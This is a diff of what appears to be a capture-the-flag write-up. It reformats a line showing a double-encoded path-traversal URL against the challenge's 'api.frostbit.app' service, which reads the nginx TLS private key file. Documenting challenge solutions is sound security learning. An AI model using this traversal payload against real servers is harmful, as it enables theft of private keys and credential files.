@@ -311,7 +311,13 @@ print(url)
 print(res.text)
 ```
 
-Which gave an URL ```https://api.frostbit.app/view/%25e9%2598%25a5%250d%2597%259e%25e2%25d7%25e9%2598%25a5%250d%2597%259e%25e2%25d7%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&digest=00000000000000000000000000000000``` that upon visiting showed me: 
+Which gave an URL 
+
+```
+https://api.frostbit.app/view/%25e9%2598%25a5%250d%2597%259e%25e2%25d7%25e9%2598%25a5%250d%2597%259e%25e2%25d7%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&digest=00000000000000000000000000000000
+```
+
+Upon visiting it, it showed me: 
 
 ![Feed message 6](/images/act3/act3-frostbit-decrypt-6.png)
 
